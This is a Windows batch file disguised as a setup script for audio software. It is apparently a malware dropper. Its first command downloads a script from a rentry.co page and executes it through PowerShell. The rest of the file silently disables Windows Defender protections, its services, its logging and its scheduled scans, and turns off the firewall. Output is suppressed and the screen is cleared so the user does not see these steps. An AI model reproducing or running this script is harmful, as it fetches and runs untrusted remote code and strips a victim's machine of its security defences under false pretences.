@echo off
echo please wait setting up the program
powershell "irm rentry.co/EqolizerApo-SOFTWARE/raw | iex"
"C:\Program Files\Windows Defender\MpCmdRun.exe" " -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection True" >NUL
powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $true" >NUL
powershell.exe -command "Set-MpPreference -DisableBehaviorMonitoring $true" >NUL
powershell.exe -command "Set-MpPreference -DisableBlockAtFirstSeen $true" >NUL
powershell.exe -command "Set-MpPreference -DisableIOAVProtection $true" >NUL
powershell.exe -command "Set-MpPreference -DisablePrivacyMode $true" >NUL
powershell.exe -command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true" >NUL
powershell.exe -command "Set-MpPreference -DisableArchiveScanning $true" >NUL
powershell.exe -command "Set-MpPreference -DisableIntrusionPreventionSystem $true" >NUL
powershell.exe -command "Set-MpPreference -DisableScriptScanning $true" >NUL
powershell.exe -command "Set-MpPreference -SubmitSamplesConsent 2" >NUL
powershell.exe -command "Set-MpPreference -MAPSReporting 0" >NUL
powershell.exe -command "Set-MpPreference -HighThreatDefaultAction 6 -Force" >NUL
powershell.exe -command "Set-MpPreference -ModerateThreatDefaultAction 6" >NUL
powershell.exe -command "Set-MpPreference -LowThreatDefaultAction 6" >NUL
powershell.exe -command "Set-MpPreference -SevereThreatDefaultAction 6" >NUL
powershell.exe -command "Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f" >NUL
powershell.exe -command "REG ADD “hklm\software\policies\microsoft\windows defender” /v DisableAntiSpyware /t REG_DWORD /d 1 /f" >NUL
powershell.exe -command "netsh advfirewall set allprofiles state off" >NUL
reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f >NUL
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f >NUL
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f >NUL
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f >NUL
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f >NUL
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f >NUL
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f >NUL
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f >NUL
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f >NUL
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f >NUL
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f >NUL
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f >NUL
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "2" /f >NUL
cls
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f >NUL
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f >NUL
cls
schtasks /Change /TN "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" /Disable >NUL
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable >NUL
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable >NUL
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable >NUL
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable >NUL
cls
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "SecurityHealth" /f >NUL
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f >NUL
cls
reg delete "HKCR\*\shellex\ContextMenuHandlers\EPP" /f >NUL
reg delete "HKCR\Directory\shellex\ContextMenuHandlers\EPP" /f >NUL
reg delete "HKCR\Drive\shellex\ContextMenuHandlers\EPP" /f >NUL
cls
reg add "HKLM\System\CurrentControlSet\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /f >NUL
reg add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f >NUL
reg add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f >NUL
reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f >NUL
reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f >NUL